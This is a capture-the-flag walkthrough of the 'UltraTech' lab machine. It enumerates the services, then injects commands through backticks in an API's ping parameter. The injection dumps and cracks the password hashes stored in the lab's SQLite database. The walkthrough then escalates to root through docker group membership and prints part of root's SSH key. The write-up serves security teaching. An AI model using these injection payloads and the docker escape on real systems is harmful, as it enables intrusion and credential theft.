# UltraTech

## Description

The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

## [Task 1] Deploy the machine

<p align="center"><strong>~_. UltraTech ._~</strong></p>

This room is inspired from real-life vulnerabilities and misconfigurations I encountered during security assessments.

If you get stuck at some point, take some time to keep enumerating.


<p align="center"><b>[ Your Mission ]</b></p>

You have been contracted by UltraTech to pentest their infrastructure.

It is a grey-box kind of assessment, the only information you have

is the company's name and their server's IP address.

Start this room by hitting the "deploy" button on the right!


Good luck and more importantly, have fun!

No answer needed

## [Task 2] It's enumeration time!

After enumerating the services and resources available on this machine, what did you discover?

### Initial Scan

Let's start with a full port Nmap scan. The scan reveals four open ports:

* 21 ftp
* 22 ssh
* 8081 http
* 31331 http

~~~
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST DELETE PATCH
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

### 2.1 - Which software is using the port 8081?

The answer is in the "VERSION" column for port 8081.

Answer: `Node.js`

### 2.2 - Which other non-standard port is used?

There is an http service on a non-standard port.

Answer: `31331`

### 2.3 - Which software using this port?

Answer: `Apache`

### 2.4 - Which GNU/Linux distribution seems to be used?

Answer: `Ubuntu`

### 2.5 - The software using the port 8080 is a REST api, how many of its routes are used by the web application?

According to [expressjs.com](https://expressjs.com/en/guide/routing.html), "Routing" refers to how an application’s endpoints (URIs) respond to client requests using methods of the Express app object that correspond to HTTP methods; for example, app.get() to handle GET requests and app.post to handle POST requests.

Let's run `gobuster` on port 8081 which is the API port, to find the routes:

~~~
┌──(user㉿Y0B01)-[~/Desktop/walkthroughs/thm/UltraTech]
└─$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://$IP:8081/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.165.168:8081/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/04 11:20:14 Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
~~~

As you can see, there are two routes: `auth` and `ping`.

Answer: `2`

## [Task 3] Let the fun begin

Now that you know which services are available, it's time to exploit them!

Did you find somewhere you could try to login? Great!

Quick and dirty login implementations usually goes with poor data management.

There must be something you can do to explore this machine more thoroughly..

### 3.1 - There is a database lying around, what is its filename?

Let's start playing around with the API routes to see how they work. I started with sending a request to `/auth` and here's the result:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/UltraTech/files]
└─$ curl -s "http://$IP:8081/auth"               
You must specify a login and a password
~~~

Apparently we need to send two parameters. Let's test `login` and `passowrd` as the parameters. I tried admin:admin for the test and got this:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/UltraTech/files]
└─$ curl -s "http://$IP:8081/auth?login=admin&password=admin"
Invalid credentials
~~~

So now we can confirm that these are the correct parameters. Let's move on to the other route, `/ping`:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/UltraTech/files]
└─$ curl -s "http://$IP:8081/ping" | html2text  
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/
lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:
112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/
lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/
index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
~~~

As you can see, we are getting an error. The API is expecting a parameter and it will call `replace` to kinda sanatize it, but since there is no parameters provided, it returns this error.

We might be able to guess the parameter. We had `login` and `password` as the parameters for `/auth`, so what does `ping` need as the parameter? An `ip` right? Let's test it out by pinging the localhost:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/UltraTech/files]
└─$ curl -s "http://$IP:8081/ping?ip=127.0.0.1"
PING localhost(localhost6.localdomain6 (::1)) 56 data bytes
64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.020 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
~~~

Nice! Now we know that the parameter is `ip`. Let's try to inject commands now. I tested `ls` as the command to inject and take a look at this:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/UltraTech/files]
└─$ curl -s 'http://10.10.165.168:8081/ping?ip=`ls`'
ping: utech.db.sqlite: Name or service not known
~~~

**Note: For the injection to work, you need to enter the whole machine ip, not just a shell variable that I usually use and it's because we are using single quotes.**

It seems like that the `ip` parameter is injectable and injecting the `ls` command revealed the name of the database.

Answer: `utech.db.sqlite`

### 3.2 - What is the first user's password hash?

Let's see if we can dump any content from the database. The `sqlite3` is not installed on the target machine, but we can dump the content using `cat` command:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/UltraTech/files]
└─$ curl -s 'http://10.10.165.168:8081/ping?ip=`cat+utech.db.sqlite`'
���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
~~~

As you can see, we got two password hashes for `r00t` and `admin`:

* r00t:f357a0c52799563c7c7b76c1e7543a32
* admin:0d0ea5111e3c1def594c1684e3b9be84

Answer: `f357a0c52799563c7c7b76c1e7543a32`

### 3.3 - What is the password associated with this hash?

Now we need to crack the hashes. We can either use `john` or `hashcat` to perform a brute-force attack to crack the hashes or check the internet to see if these hashes have been cracked already. I used [crackstation](https://crackstation.net) and I was able to crack both of the hashes:

<p align="center"><img src="files/cracked.png"></p>

Here's the usernames and passwords:

* r00t:n100906
* admin:mrsheafy

Answer: `n100906`

## [Task 4] The root of all evil

Congrats if you've made it this far, you should be able to comfortably run commands on the server by now!

Now's the time for the final step!

You'll be on your own for this one, there is only one question and there might be more than a single way to reach your goal.

Mistakes were made, take advantage of it.

### 4.1 - What are the first 9 characters of the root user's private SSH key?

First I tried the creds on `/auth` and both of them resulted to this message:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/UltraTech/files]
└─$ curl -s "http://$IP:8081/auth?login=admin&password=mrsheafy" | html2text
****** Restricted area ******
Hey r00t, can you please have a look at the server's configuration?
The intern did it and I don't really trust him.
Thanks!

lp1
~~~

Next I decided to try the creds on the ssh service and I was able to connect to the machine as `r00t` (`r00t:n100906`):

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/UltraTech/files]
└─$ ssh r00t@$IP
r00t@10.10.165.168's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

[REDACTED]

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$
~~~

#### Going root

Now we need the first nine characters of the root's ssh key, so we need to gain root access first. I checked my sudo permissions with `sudo -l` and we have none. When I ran `id` command, I realized that we are in a `docker` group:

~~~
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
                                                ^^^^^^^^^^^
~~~

Let's check the docker images:

~~~
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        2 years ago         15.8MB
~~~

As you can see, there is a `bash` container installed. I checked [GTFOBins](https://gtfobins.github.io/) for docker and it tells us that "It can be used to break out from restricted environments by spawning an interactive system shell". `bash` is installed, so let's try it. Here's the command:

~~~
docker run -v /:/mnt --rm -it bash chroot /mnt bash
~~~

I tested it and it worked:

~~~
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@129cdba9ac9e:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
~~~

Now let's head to `/root` to see what we can find there:

~~~
root@129cdba9ac9e:/# cd /root
root@129cdba9ac9e:~# ls -la
total 40
drwx------  6 root root 4096 Mar 22  2019 .
drwxr-xr-x 23 root root 4096 Mar 19  2019 ..
-rw-------  1 root root  844 Mar 22  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Mar 22  2019 .cache
drwx------  3 root root 4096 Mar 22  2019 .emacs.d
drwx------  3 root root 4096 Mar 22  2019 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root    0 Mar 22  2019 .python_history
drwx------  2 root root 4096 Mar 22  2019 .ssh
-rw-rw-rw-  1 root root  193 Mar 22  2019 private.txt
~~~

There is a private message. Let's read it:

~~~
root@129cdba9ac9e:~# cat private.txt 
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful
~~~

Let's read the SSH key to answer the question:

~~~
root@129cdba9ac9e:~# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA

[REDACTED]
~~~

The answer is the first nine characters of the SSH key.

Answer: `MIIEogIBA`

# D0N3! ; )

Thanks to creator(s)!

Hope you had fun and learned something.

Have a g00d 0ne! : )